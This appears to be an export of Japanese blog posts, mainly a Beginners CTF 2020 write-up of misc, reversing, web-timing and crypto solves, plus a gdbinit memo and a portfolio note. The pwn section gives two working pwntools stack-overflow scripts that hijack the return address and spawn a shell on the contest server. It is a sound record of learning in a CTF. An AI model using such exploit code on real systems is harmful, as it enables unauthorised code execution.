[{"content":"5/23-5/24のBeginners CTFに参加した。\nぼっち参加で272pt/309位だった。（散々）\n色々勉強になったし久しぶりだったので楽しかった。\nまた暇を見つけてCTFはやろうと思う。\n解けた問題は以下。\n [Misc] Welcome [Misc] emoemoencode [Reversing] mask [Web] Spy [Crypt] R\u0026amp;B  今回どうしても解けなかったのがpwnのBeginner\u0026rsquo;s Stack。\nBeginner(Beginner向けとは言ってない)\n得点を狙っていくならどんどん他の解けそうな問題に行くべきなのだろうが、別に勝ちに行くアレでも無いので勉強だと思って限界までpwnで粘った。そして敗れた\nBeginnerなんてタグ付けられたら諦めるわけにも行かんですしね。\nまぁそんなこんなでだらだら書いていく。\n[Misc] Welcome 毎度おなじみwelcome。\ndiscordのサーバにアクセスしてflagをコピペするだけ。\nctf4b{sorry, we lost the ownership of our irc channel so we decided to use discord} そういやSECCON関係なのにircじゃないなぁって思ってたけどそういうことだったのか。\nWriteupを書くまで気が付かなかった。（本番のときはとりあえずコピペなので）\n[Misc] emoemoencode これは序盤にかなり詰まって後回しにしたやつ。\n既存のエンコード形式が存在する知識問題だと思ってかなりの時間を取られた。\necojiとかのツールを入れてみたり、色々なサイトを巡ったが全部無駄足だったようだ。\n結局これが解けた最後の問題だったという\u0026hellip;\n以下の短い絵文字の文字列が与えられる。\n🍣🍴🍦🌴🍢🍻🍳🍴🍥🍧🍡🍮🌰🍧🍲🍡🍰🍨🍹🍟🍢🍹🍟🍥🍭🌰🌰🌰🌰🌰🌰🍪🍩🍽 困り果てた僕は取り敢えず、文字の規則性を調べてみた。\n127843,127860,127846,127796,127842,127867,127859,127860,127845,127847,127841,127854,127792,... pythonのord関数で数値を調べてみると、1文字目と3文字目の下一桁の値の差が丁度3つ分。\nこれはflagの形式のctf4bのcとfの関係にあたる。\ncを基準に文字コードの差を取って復元してみると、\n1 2 3 4 5 6 7 8 9 10  data=open(\u0026#39;./emoemoencode.txt\u0026#39;).readline() data=data.rstrip(\u0026#39;\\n\u0026#39;) diff=[] for w in data: diff.append(ord(w)-ord(data[0])) print(diff) for d in diff: print(chr(ord(\u0026#39;c\u0026#39;)+d),end=\u0026#34;\u0026#34;)   flagが出てきた。\n[0, 17, 3, -47, -1, 24, 16, 17, 2, 4, -2, 11, -51, 4, 15, -2, 13, 5, 22, -4, -1, 22, -4, 2, 10, -51, -51, -51, -51, -51, -51, 7, 6, 26] ctf4b{stegan0graphy_by_em000000ji} [Reversing] mask とりあえず実行。\n引数に文字列を取るらしいので取り敢えずctf4b{}と入れてみる。\n$ ./mask ctf4b{} Putting on masks... atd4`qu c`b bki Wrong FLAG. Try again. 二通りの謎の文字列が出てきた。\nそこで、Reversingの鉄則であるstringsを試してみる。\nすると、\n$ strings mask []A\\A]A^A_ Usage: ./mask [FLAG] Putting on masks... atd4`qdedtUpetepqeUdaaeUeaqau c`b bk`kj`KbababcaKbacaKiacki Correct! Submit your FLAG. Wrong FLAG. Try again. ;*3$\u0026quot; GCC: (Arch Linux 9.3.0-1) 9.3.0 なんともまぁ都合の良い文字列が。\ngdb-pedaで内容をざっと見しながらデバックしてみる。\n天才である私はそのときのメモを残してあった。（偉い）\n 0x000055555555520c \u0026lt;+147\u0026gt;:\tmov eax,DWORD PTR [rbp-0xd8] 0x0000555555555212 \u0026lt;+153\u0026gt;:\tcdqe 0x0000555555555214 \u0026lt;+155\u0026gt;:\tmovzx eax,BYTE PTR [rbp+rax*1-0xd0]\t// get char 0x000055555555521c \u0026lt;+163\u0026gt;:\tand eax,0x75\t// char \u0026amp; 0x75 =\u0026gt; 0x000055555555521f \u0026lt;+166\u0026gt;:\tmov edx,eax 0x0000555555555221 \u0026lt;+168\u0026gt;:\tmov eax,DWORD PTR [rbp-0xd8]\t// get counter 0x0000555555555227 \u0026lt;+174\u0026gt;:\tcdqe 0x0000555555555229 \u0026lt;+176\u0026gt;:\tmov BYTE PTR [rbp+rax\\*1-0x90],dl\t// save result 0x0000555555555230 \u0026lt;+183\u0026gt;:\tmov eax,DWORD PTR [rbp-0xd8] 0x0000555555555236 \u0026lt;+189\u0026gt;:\tcdqe 0x0000555555555238 \u0026lt;+191\u0026gt;:\tmovzx eax,BYTE PTR [rbp+rax\\*1-0xd0]\t// get char again 0x0000555555555240 \u0026lt;+199\u0026gt;:\tand eax,0xffffffeb\t// char \u0026amp; 0xeb 0x0000555555555243 \u0026lt;+202\u0026gt;:\tmov edx,eax 0x0000555555555245 \u0026lt;+204\u0026gt;:\tmov eax,DWORD PTR [rbp-0xd8] 0x000055555555524b \u0026lt;+210\u0026gt;:\tcdqe 0x000055555555524d \u0026lt;+212\u0026gt;:\tmov BYTE PTR [rbp+rax\\*1-0x50],dl 0x0000555555555251 \u0026lt;+216\u0026gt;:\tadd DWORD PTR [rbp-0xd8],0x1 0x0000555555555258 \u0026lt;+223\u0026gt;:\tmov eax,DWORD PTR [rbp-0xd8]\t// counter++ 0x000055555555525e \u0026lt;+229\u0026gt;:\tcmp eax,DWORD PTR [rbp-0xd4] 0x0000555555555264 \u0026lt;+235\u0026gt;:\tjl 0x55555555520c \u0026lt;main+147\u0026gt; こんな感じでディスアセンブルしたものにコメントを付けていくと、2つの処理があった。\n一つは各文字と0x75をandする処理。\nもうひとつは各文字と0xebをandする処理。\nこれらの両方に合致する文字列がflagになるということになる。\n他の人のwriteupを見るともっと合理的な処理もある感じだがそこまで重たい処理ではないので自分は総当りした。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  flag=\u0026#34;\u0026#34; words=\u0026#34;\u0026#34; expect=\u0026#34;atd4`qdedtUpetepqeUdaaeUeaqau\u0026#34; expect2=\u0026#34;c`b bk`kj`KbababcaKbacaKiacki\u0026#34; for i in range(ord(\u0026#39;!\u0026#39;),ord(\u0026#39;~\u0026#39;)+1): words+=chr(i) for i in range(len(expect)): for w in words: if expect[i] == chr(ord(w) \u0026amp; 0x75) and expect2[i] == chr(ord(w) \u0026amp; 0xffffffeb): flag+=w print(flag)   改めて見るとゴリ押しもいいとこである。\n得られたflagはこちら。\nctf4b{dont_reverse_face_mask} [Web] Spy サーバ側で動いているであろうapp.pyと従業員一覧が書かれたemployees.txt、それからログインページらしきWebページのリンクが与えられる。\nどうやらこのサイトを利用している従業員をリストから全て選ぶとflagが降ってくる具合らしい。\nさて、どうやって利用者か否かを調べるかだが、app.pyを見てみると、\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  @app.route(\u0026#34;/\u0026#34;, methods=[\u0026#34;GET\u0026#34;, \u0026#34;POST\u0026#34;]) def index(): t = time.perf_counter() if request.method == \u0026#34;GET\u0026#34;: return render_template(\u0026#34;index.html\u0026#34;, message=\u0026#34;Please login.\u0026#34;, sec=\u0026#34;{:.7f}\u0026#34;.format(time.perf_counter()-t)) if request.method == \u0026#34;POST\u0026#34;: name = request.form[\u0026#34;name\u0026#34;] password = request.form[\u0026#34;password\u0026#34;] exists, account = db.get_account(name) if not exists: return render_template(\u0026#34;index.html\u0026#34;, message=\u0026#34;Login failed, try again.\u0026#34;, sec=\u0026#34;{:.7f}\u0026#34;.format(time.perf_counter()-t)) # auth.calc_password_hash(salt, password) adds salt and performs stretching so many times. # You know, it\u0026#39;s really secure... isn\u0026#39;t it? :-) hashed_password = auth.calc_password_hash(app.SALT, password) if hashed_password != account.password: return render_template(\u0026#34;index.html\u0026#34;, message=\u0026#34;Login failed, try again.\u0026#34;, sec=\u0026#34;{:.7f}\u0026#34;.format(time.perf_counter()-t)) session[\u0026#34;name\u0026#34;] = name return render_template(\u0026#34;dashboard.html\u0026#34;, sec=\u0026#34;{:.7f}\u0026#34;.format(time.perf_counter()-t))   どうやら最初に名前がDBにあるか確認し、無かったらメッセージを返してあったらハッシュを計算という感じ。\nこれならパスワード無しでも推測できるかも。\n取り敢えず、DBにデータが無かったらすぐにindex.htmlを返すので処理時間に差が出るかもと思い計測してみる。\n本来なら計測用のコードがここで出てくるはずだが、自分は面倒だったので気合で人力計測してしまった。（ワンライナーは得意なんだからこういうところで役立てたらいいのに）\n見事にビンゴ。flagは、\nctf4b{4cc0un7_3num3r4710n_by_51d3_ch4nn3l_4774ck} [Crypt] R\u0026amp;B フラグをあるプログラムでエンコードしたから、それを復元してねという問題。\nエンコードされたフラグとプログラムは以下。\nBQlVrOUllRGxXY2xGNVJuQjRkVFZ5U0VVMGNVZEpiRVpTZVZadmQwOWhTVEIxTkhKTFNWSkdWRUZIUlRGWFUwRklUVlpJTVhGc1NFaDFaVVY1Ukd0Rk1qbDFSM3BuVjFwNGVXVkdWWEZYU0RCTldFZ3dRVmR5VVZOTGNGSjFTMjR6VjBWSE1rMVRXak5KV1hCTGVYZEplR3BzY0VsamJFaGhlV0pGUjFOUFNEQk5Wa1pIVFZaYVVqRm9TbUZqWVhKU2NVaElNM0ZTY25kSU1VWlJUMkZJVWsxV1NESjFhVnBVY0d0R1NIVXhUVEJ4TmsweFYyeEdNVUUxUlRCNVIwa3djVmRNYlVGclJUQXhURVZIVGpWR1ZVOVpja2x4UVZwVVFURkZVblZYYmxOaWFrRktTVlJJWVhsTFJFbFhRVUY0UlZkSk1YRlRiMGcwTlE9PQ== 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  FLAG = getenv(\u0026#34;FLAG\u0026#34;) FORMAT = getenv(\u0026#34;FORMAT\u0026#34;) def rot13_encode(s): #return codecs.encode(s,\u0026#39;rot13\u0026#39;) def base64_encode(s): #return base64.b64encode(s.encode(\u0026#39;utf-8\u0026#39;)).decode(\u0026#39;utf-8\u0026#39;) for t in FORMAT: if t == \u0026#34;R\u0026#34;: FLAG = \u0026#34;R\u0026#34; + rot13_encode(FLAG) if t == \u0026#34;B\u0026#34;: FLAG = \u0026#34;B\u0026#34; + base64_encode(FLAG) print(FLAG)   コメントの部分は推測するために自分で付け足した。（元々は無い）\nデコードするときはこれの逆の処理をするプログラムを書けば良い。\nエンコード関数から逆算してデコード関数を用意し、Rから始まるならrot13_decode()、Bから始まるならbase64_decode()を使えば良い。\nソルバは以下。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  from os import getenv import base64 import codecs encoded=open(\u0026#39;./encoded_flag\u0026#39;).readlines() flag=encoded[0] def rot13_decode(s): return codecs.decode(s,\u0026#39;rot13\u0026#39;) def base64_decode(s): return base64.b64decode(s.encode(\u0026#39;utf-8\u0026#39;)).decode(\u0026#39;utf-8\u0026#39;) for i in range(10): if flag[0] == \u0026#34;R\u0026#34;: flag=flag[1:] flag = rot13_decode(flag) if flag[0] == \u0026#34;B\u0026#34;: flag=flag[1:] flag = base64_decode(flag) print(flag) print(\u0026#34;result:\u0026#34;,flag)   ループ回数は適当。\n単純に与えられたコードの逆の処理を書いていくことで求まる。\n結果は以下。\nBUk9IeDlWclF5RnB4dTVySEU0cUdJbEZSeVZvd09hSTB1NHJLSVJGVEFHRTFXU0FITVZIMXFsSEh1ZUV5RGtFMjl1R3pnV1p4eWVGVXFXSDBNWEgwQVdyUVNLcFJ1S24zV0VHMk1TWjNJWXBLeXdJeGpscEljbEhheWJFR1NPSDBNVkZHTVZaUjFoSmFjYXJScUhIM3FScndIMUZRT2FIUk1WSDJ1aVpUcGtGSHUxTTBxNk0xV2xGMUE1RTB5R0kwcVdMbUFrRTAxTEVHTjVGVU9ZcklxQVpUQTFFUnVXblNiakFKSVRIYXlLRElXQUF4RVdJMXFTb0g0NQ== ROHx9VrQyFpxu5rHE4qGIlFRyVowOaI0u4rKIRFTAGE1WSAHMVH1qlHHueEyDkE29uGzgWZxyeFUqWH0MXH0AWrQSKpRuKn3WEG2MSZ3IYpKywIxjlpIclHaybEGSOH0MVFGMVZR1hJacarRqHH3qRrwH1FQOaHRMVH2uiZTpkFHu1M0q6M1WlF1A5E0yGI0qWLmAkE01LEGN5FUOYrIqAZTA1ERuWnSbjAJITHayKDIWAAxEWI1qSoH45 ROHx9RrHyyDxu5rHIHn0gWHxyuDHcSGRE5FHSWrQHkFT1GoaNkI2IkHwISFJSCIx1WpHWkrQOfE3uKqycVL2qZrRyhE1ASFHI6H0MnZzgxGTSwDz55H0gPFHSho0g1IHugGzgRrKSyGISWGIc3qGMXE09HpKyWM0cuDHIhZ05eFRyWARM6DIWWEmN9 RODyIeBHyyETkKIRIaAJELDyIAIx51HmSnp1WeqR5EIaOVMIqBqx0lGxWvZHcgLxInGSEIEzSFZ2kdLacBnySKBIAnoKuUHmNkDyqeMQIMZwu6JGOTqyIgJaAEn3NkHII4FzARIG0= BUk9IeDlWTEg5dXBUMVNuS1ZsRktNQVpHeWNvM2NBb1JmbEZLTUFaR3ljbzNjQW9SZmxGS01BWkd5Y28zY0FvUmZsQkp1QUxJcDU= ROHx9VLH9upT1SnKVlFKMAZGyco3cAoRflFKMAZGyco3cAoRflFKMAZGyco3cAoRflBJuALIp5 ROHaOapmEir2IvM19iozMlK2IvM19iozMlK2IvM19iozMlK29hMaW9 Rpgs4o{ebg_onfr_ebg_onfr_ebg_onfr_onfr} ctf4b{rot_base_rot_base_rot_base_base} ctf4b{rot_base_rot_base_rot_base_base} result: ctf4b{rot_base_rot_base_rot_base_base} 解けなかった問題(Beginner\u0026rsquo;s Stack) Beginner\u0026rsquo;s Stack(Beginner向けとは言ってない)\n典型的なスタックオーバーフロー問題。\n今まで僕はpwnを問いたことがなく、戦略上避けるべきだったが今回は逃げずに挑戦することにした。\n実際、あと一歩のところまでいったがflag獲得には至らなかった。（悲しい）\n実行ファイルがとサーバのアドレスが与えられる。\n内容は一緒。多分サーバに負荷がかからないような配慮だと思う。\n実行ファイルを実行すると、スタックが図示され入力を求められる。\nとりあえず0をいっぱい入力してみる。\nYour goal is to call `win` function (located at 0x400861) [ Address ] [ Stack ] +--------------------+ 0x00007ffdb5c8e790 | 0x0000000000000000 | \u0026lt;-- buf +--------------------+ 0x00007ffdb5c8e798 | 0x0000000000000000 | +--------------------+ 0x00007ffdb5c8e7a0 | 0x0000000000000000 | +--------------------+ 0x00007ffdb5c8e7a8 | 0x00007f4c06ef5190 | +--------------------+ 0x00007ffdb5c8e7b0 | 0x00007ffdb5c8e7c0 | \u0026lt;-- saved rbp (vuln) +--------------------+ 0x00007ffdb5c8e7b8 | 0x000000000040084e | \u0026lt;-- return address (vuln) +--------------------+ 0x00007ffdb5c8e7c0 | 0x0000000000400ad0 | \u0026lt;-- saved rbp (main) +--------------------+ 0x00007ffdb5c8e7c8 | 0x00007f4c06d01bbb | \u0026lt;-- return address (main) +--------------------+ 0x00007ffdb5c8e7d0 | 0x00007f4c06e914d8 | +--------------------+ 0x00007ffdb5c8e7d8 | 0x00007ffdb5c8e8a8 | +--------------------+ Input: 000000000000000000000000000000000 [ Address ] [ Stack ] +--------------------+ 0x00007ffdb5c8e790 | 0x3030303030303030 | \u0026lt;-- buf +--------------------+ 0x00007ffdb5c8e798 | 0x3030303030303030 | +--------------------+ 0x00007ffdb5c8e7a0 | 0x3030303030303030 | +--------------------+ 0x00007ffdb5c8e7a8 | 0x3030303030303030 | +--------------------+ 0x00007ffdb5c8e7b0 | 0x00007ffdb5c80a30 | \u0026lt;-- saved rbp (vuln) +--------------------+ 0x00007ffdb5c8e7b8 | 0x000000000040084e | \u0026lt;-- return address (vuln) +--------------------+ 0x00007ffdb5c8e7c0 | 0x0000000000400ad0 | \u0026lt;-- saved rbp (main) +--------------------+ 0x00007ffdb5c8e7c8 | 0x00007f4c06d01bbb | \u0026lt;-- return address (main) +--------------------+ 0x00007ffdb5c8e7d0 | 0x00007f4c06e914d8 | +--------------------+ 0x00007ffdb5c8e7d8 | 0x00007ffdb5c8e8a8 | +--------------------+ 入力がbufを超えて他のデータまで書き換えていることが分かる。（ちなみに30とは0のasciiコードである0x30）\nなるほどこれはわかりやすい。\n0x400861にあるwinを呼び出せば勝ちらしいのでvulnのreturnアドレスを書き換えればvulnに戻るときにwinに跳べるはず（これが一発で分かるだけでも一年前より成長した気がする）\nそれには値をよしなに変える必要がある。もしvulnのrbpを破壊せずにreturn addressを書き換えるならascii範囲外のデータを与える必要がある。（結局必要なかったけど）\n困っているとどうやらpwntoolsなるものがあるらしい。\nこれならバイナリデータをそのままぶちこむことができる。\n最初から最後まで自動化できるしなるほどこれは便利。\nこうしてreturn addressだけを書き換えることはできた。\n +--------------------+ 0x00007ffeed69c960 | 0x00007ffeed69c970 | \u0026lt;-- saved rbp (vuln) +--------------------+ 0x00007ffeed69c968 | 0x0000000000400861 | \u0026lt;-- return address (vuln) +--------------------+ 0x00007ffeed69c970 | 0x0000000000400ad0 | \u0026lt;-- saved rbp (main) +--------------------+ 0x00007ffeed69c978 | 0x00007fee2cb27b97 | \u0026lt;-- return address (main) +--------------------+ これでOKや！！！的なことを考えていたらこんなメッセージが出てきた。\nOops! RSP is misaligned! Some functions such as `system` use `movaps` instructions in libc-2.27 and later. This instruction fails when RSP is not a multiple of 0x10. Find a way to align RSP! You're almost there! なんじゃと。これはCコンパイラ自作のときにも出会った「RSPは関数呼び出しの際に必ず16の倍数でなければならない」というルールそのものだった。\nしかし、困った。そもそも変えたのはスタック内のアドレスでスタックポインタが変わるような操作をした覚えがない。\n考えられるのは入力でオーバーフローしてスタックに積まれる値が変わったかも知れないくらいだ。\nさて、内部状態も分からないしどこの関数での状態なのかが分からない。\nスタックの状態からvuln内から呼び出した関数のどっかくらいなもんである。\nこの時点でもう解き初めて二時間位経ってた気がする。\nここから地獄が始まる。\n最初に考えついたのは入力する文字列からスタックポインタを調整する案。\nもしかしたらバッファオーバーフローしたときも実はその分だけスタックポインタが動いていてそれが16の倍数から外れる原因なのではないかというものだ。\n色々入力する文字の数を調整して試してみるがなかなか上手く行かない。\n次に思いついたのがrbpをいじって次の関数のスタックポインタをいじってしまおうという方法。\nvulnとmainそれぞれにrbpとrspの値があったのでどっちも使うんじゃないか？と邪推した。\n何かよく分からんが上手く行きそうな気がしてずっと試していた。\n結局、夜は2時まで朝は目覚ましをかけて9時から終了時間までずっと意地で粘っていたが解けることは無かった。非常に悲しい。\n絶対解けると思っていたがそんなに甘くなかった。\n粘った証をここに残しておく。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96  from pwn import * buf=\u0026#34;\u0026#34; send_data=\u0026#34;\u0026#34; main_rbp=\u0026#34;400ad0\u0026#34; terget_address=\u0026#34;400861\u0026#34; saved_vuln=\u0026#34;\u0026#34; ret_vuln=\u0026#34;\u0026#34; saved_main=\u0026#34;\u0026#34; ret_main=\u0026#34;\u0026#34; conn=remote(\u0026#39;bs.quals.beginners.seccon.jp\u0026#39;,9001) buf=conn.recvline() buf=conn.recvline() buf=conn.recvline() buf=conn.recvline() buf=conn.recvline() buf=conn.recvline() buf=conn.recvline() buf=conn.recvline() buf=conn.recvline() buf=conn.recvline() buf=conn.recvline() buf=conn.recvline() buf=conn.recvline() saved_vuln=buf.decode(\u0026#39;utf-8\u0026#39;) saved_vuln=saved_vuln[23:39] buf=conn.recvline() buf=conn.recvline() ret_vuln=buf.decode(\u0026#39;utf-8\u0026#39;) ret_vuln=ret_vuln[23:39] buf=conn.recvline() buf=conn.recvline() saved_main=buf.decode(\u0026#39;utf-8\u0026#39;) saved_main=saved_main[23:39] buf=conn.recvline() buf=conn.recvline() ret_main=buf.decode(\u0026#39;utf-8\u0026#39;) ret_main=ret_main[23:39] print(saved_vuln) print(ret_vuln) print(saved_main) print(ret_main) # padding for i in range(8*4): send_data+=\u0026#39;\\0\u0026#39; # saved_vuln address for i in reversed(range(0,len(saved_vuln),2)): if i==len(saved_vuln)-2: send_data+=chr(int(saved_vuln[i:i+2],16)-0) else: send_data+=chr(int(saved_vuln[i:i+2],16)) # change address for i in reversed(range(0,len(terget_address),2)): send_data+=chr(int(terget_address[i:i+2],16)) for i in range(5): send_data+=\u0026#39;\\0\u0026#39; \u0026#34;\u0026#34;\u0026#34; # ret_vuln address for i in reversed(range(0,len(ret_vuln),2)): if i==len(ret_vuln)-2: send_data+=chr(int(ret_vuln[i:i+2],16)+0) else: send_data+=chr(int(ret_vuln[i:i+2],16)) \u0026#34;\u0026#34;\u0026#34; # saved_main address for i in reversed(range(0,len(saved_main),2)): if i==len(saved_main)-2: send_data+=chr(int(saved_main[i:i+2],16)-0) else: send_data+=chr(int(saved_main[i:i+2],16)) # ret_main address for i in reversed(range(2,len(ret_main),2)): send_data+=chr(int(ret_main[i:i+2],16)) conn.recvuntil(\u0026#34;Input: \u0026#34;) conn.send(send_data) result=conn.recvall() conn.interactive() conn.close() print(result.decode(\u0026#39;utf-8\u0026#39;)) print(send_data)   色んなところのアドレスを書き換えられるようにして色々試してみたが結局ダメだった。\n謎は深まるばかり。\n他人のWriteupを読んでみた 悔しいので終了直後から色々探していた。\n見てみるとどうやら跳ぶ先のアドレスをいい感じ変えたりvulnのreturn addressを変えてleaveを飛ばしてrbpの方で調整する方法などが見つかった。\n早速試してみる。（今記事を書きながら試してる）\n試してみたらできた。やっぱりvulnとmainどっちも使うのが正攻法っぽい。\nvulnのreturn addressをvulnのret命令に持ってきてmainのrbpをwinの関数のアドレスに書き換えれば、leaの処理によるrspのズレがなくなる。\nなるほど。これなら納得。\n変更したコードは以下の通り。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96  from pwn import * buf=\u0026#34;\u0026#34; send_data=\u0026#34;\u0026#34; main_rbp=\u0026#34;400ad0\u0026#34; terget_address=\u0026#34;400861\u0026#34; saved_vuln=\u0026#34;\u0026#34; ret_vuln=\u0026#34;\u0026#34; saved_main=\u0026#34;\u0026#34; ret_main=\u0026#34;\u0026#34; conn=remote(\u0026#39;bs.quals.beginners.seccon.jp\u0026#39;,9001) buf=conn.recvline() buf=conn.recvline() buf=conn.recvline() buf=conn.recvline() buf=conn.recvline() buf=conn.recvline() buf=conn.recvline() buf=conn.recvline() buf=conn.recvline() buf=conn.recvline() buf=conn.recvline() buf=conn.recvline() buf=conn.recvline() saved_vuln=buf.decode(\u0026#39;utf-8\u0026#39;) saved_vuln=saved_vuln[23:39] buf=conn.recvline() buf=conn.recvline() ret_vuln=buf.decode(\u0026#39;utf-8\u0026#39;) ret_vuln=ret_vuln[23:39] buf=conn.recvline() buf=conn.recvline() saved_main=buf.decode(\u0026#39;utf-8\u0026#39;) saved_main=saved_main[23:39] buf=conn.recvline() buf=conn.recvline() ret_main=buf.decode(\u0026#39;utf-8\u0026#39;) ret_main=ret_main[23:39] print(saved_vuln) print(ret_vuln) print(saved_main) print(ret_main) # padding for i in range(8*4): send_data+=\u0026#39;\\0\u0026#39; # saved_vuln address for i in reversed(range(0,len(saved_vuln),2)): if i==len(saved_vuln)-2: send_data+=chr(int(saved_vuln[i:i+2],16)-0) else: send_data+=chr(int(saved_vuln[i:i+2],16)) # ret_vuln address for i in reversed(range(0,len(ret_vuln),2)): if i==len(ret_vuln)-2: send_data+=chr(int(ret_vuln[i:i+2],16)+18) else: send_data+=chr(int(ret_vuln[i:i+2],16)) \u0026#34;\u0026#34;\u0026#34; # saved_main address for i in reversed(range(0,len(saved_main),2)): if i==len(saved_main)-2: send_data+=chr(int(saved_main[i:i+2],16)-0) else: send_data+=chr(int(saved_main[i:i+2],16)) \u0026#34;\u0026#34;\u0026#34; # change address for i in reversed(range(0,len(terget_address),2)): send_data+=chr(int(terget_address[i:i+2],16)) for i in range(5): send_data+=\u0026#39;\\0\u0026#39; # ret_main address for i in reversed(range(2,len(ret_main),2)): send_data+=chr(int(ret_main[i:i+2],16)) conn.recvuntil(\u0026#34;Input: \u0026#34;) conn.send(send_data) conn.interactive() result=conn.recvall() conn.close() print(result.decode(\u0026#39;utf-8\u0026#39;)) print(send_data)   あぁスッキリした。\nこの後はシェルに入れるので、\n[+] Opening connection to bs.quals.beginners.seccon.jp on port 9001: Done 00007ffed9108c60 000000000040084e 0000000000400ad0 00007ff73a5d7b97 [*] Switching to interactive mode [ Address ] [ Stack ] +--------------------+ 0x00007ffed9108c30 | 0x0000000000000000 | \u0026lt;-- buf +--------------------+ 0x00007ffed9108c38 | 0x0000000000000000 | +--------------------+ 0x00007ffed9108c40 | 0x0000000000000000 | +--------------------+ 0x00007ffed9108c48 | 0x0000000000000000 | +--------------------+ 0x00007ffed9108c50 | 0x00007ffed9108c60 | \u0026lt;-- saved rbp (vuln) +--------------------+ 0x00007ffed9108c58 | 0x0000000000400860 | \u0026lt;-- return address (vuln) +--------------------+ 0x00007ffed9108c60 | 0x0000000000400861 | \u0026lt;-- saved rbp (main) +--------------------+ 0x00007ffed9108c68 | 0x00007ff73a5d7b97 | \u0026lt;-- return address (main) +--------------------+ 0x00007ffed9108c70 | 0x0000000000000001 | +--------------------+ 0x00007ffed9108c78 | 0x00007ffed9108d48 | +--------------------+ Congratulations! $ ls chall flag.txt redir.sh $ cat fla cat: fla: No such file or directory $ cat flag.txt ctf4b{u_r_st4ck_pwn_b3g1nn3r_tada} catしてflagを見るだけ。\nいやぁ惜しかった。今回はデバッガを上手く使えなかったのが敗因な気がする。\nまさか、rspとrbpの合わせ技とは思わなかった。\n最近勉強した技術が生かされていて楽しかったしためになったのでこれからもpwnには挑戦し続けたいと思う。\n感想 pwnがあと少しのところで解けなかったのは大変心残りだがこれが今の実力だろう。\n今までは大会とかがあると解ける問題だけをやっていたが今回はまんべんなく挑戦できた。（そもそも出てこなかった分野は沢山あったが）\nこれから色んな分野に挑戦して解ける問題を増やしていきたい。\n色々やりたいしたいことがあって(コンパイラとか競プロとかWebとか)大変だがCTFはジャンルが万遍なく広がっていて精進するにはもってこいなので合間を見つけてどんどん解いていきたい。\nということで24時間お疲れ自分。\n","description":"反省文。","id":9,"section":"posts","tags":["CTF","SECCON"],"title":"Beginners CTF 2020 Write up","uri":"https://takana-norimasa.github.io/blog/posts/ctf4b_2020/"},{"content":"経緯 結構詰まったのでメモ。\n今まで普通のCのデバッグにはGDB、アセンブラを読むときには拡張のgdb-pedaを使っていた。\nつまりgdbを使うときは、\n1  $ gdb -nx terget_file   gdb-pedaを使うときは、\n1  $ gdb terget_file   としていたのだ。\n最近になって本格的にCのデバッグをするようになった（それまではpedaしか使ってなかった）のでgdb dashboardを導入することにした。\nしかし、gdb dashboardもgdb-pedaも~/.gdbinitを使って機能の拡張を行うのでどちらか一方しか拡張機能を使えない。\nCとアセンブラによって拡張機能を使い分けたいのでこれは困った\u0026hellip;\n~/.gdbinitの使い分け 2つの拡張機能を利用するにはどうにか上手いこと2つのgdbinitを使い分けるのが理想的だ。\nいい感じにgdbinitの参照先を指定できるオプションがあれば良いのだが\u0026hellip;\n解決方法 かなりの試行錯誤の末ついに方法を見つけた。\nまず、拡張機能ごとにgdbinitを分ける。\n自分の場合はgdb dashboardは~/.gdbinitに、gdb-pedaは~/.gdbinit_pedaにそれぞれ設定を書いた。\nこれで普通にgdbを実行したときにはデフォルトの設定ファイルである~/.gdbinitが読まれるのでgdb dashboardが使える。\nでは、gdb-pedaを使いたい場合はどうするのか？\ngdb-pedaを使うときは以下のようにコマンドを叩いてgdbを起動させる。\n1  gdb -nx -ix=~/.gdbinit_peda   -nxでデフォルトの~/.gdbinitを読まないようにして-ixで新しい~/.gdbinit_pedaを読ませるようにしている。\ngdb --helpの\n \u0026ndash;init-command=FILE, -ix\nLike -x but execute commands before loading inferior.\n の部分が設定ファイルの項目だと気づくのに時間がかかった。\n後はzshrcに以下のようにaliasの設定をすれば\n1  alias gdb-peda=\u0026#39;gdb -nx -ix=~/.gdbinit_peda\u0026#39;   2つの拡張機能をコマンド1つで使い分けることができるようになる。\n1 2 3 4 5  # gdb dashboard $ gdb # gdb-peda $ gdb-peda   これで一見落着。\n","description":"gdb dashboardとgdb-pedaを使い分けるための奮闘録","id":10,"section":"posts","tags":["gdb","gdb-peda","memo"],"title":"gdbinitを使い分ける","uri":"https://takana-norimasa.github.io/blog/posts/gdbinit/"},{"content":"お知らせ このブログができるずっと前から建設を進めていたポートフォリオがようやく完成しました。\n疲れた\u0026hellip;（満身創痍）\n上のバーのAbout meからいつでも見られます。\nlink:https://takana-norimasa.github.io/\nレポジトリを見てみると去年の10/22から始まってますね（実際はそれよりちょっと前だけど）\n経緯 実はこのブログを作る前からずっと作りたかったものの一つで、Webの知識が少しでも欲しくて入門編にしたかったのと他の人のポートフォリオを見ていいなぁと思ったからというのが主な動機です。\n今までにも何度かWeb系は触ったことがあるのですがとても実用的なものではないですし\u0026hellip;（高専プロコンの競技用のシュミレータ作ったりとかで触ったけど）\n自分の作ったものをまとめたら良い自己紹介がわりになるし、バラバラになっている成果も集約できるかもと思いながら作業に入りました。\n実際はかなり大変だった\u0026hellip;\n振り返り それじゃあ振り返っていきましょう。\nレポジトリはこちら。（実装がひどすぎるので見せたくないけど）\n 構想段階 僕はWebの知識は皆無なのでライブラリでゴリ押すか逆にそれらに頼らず力押しするかのどっちかだったのですが、ちょうど思いついたアイデアがライブラリなしで行けそうだったので力押し作戦をとることにしました。\n思いついたアイデアはターミナルの再現。インタラクティブにターミナル操作の要領で説明が出てくる感じです。\nこれならオシャレなセンスも要らないし見ていて楽しいかなぁと思ったのでこれにしました。\n初期段階 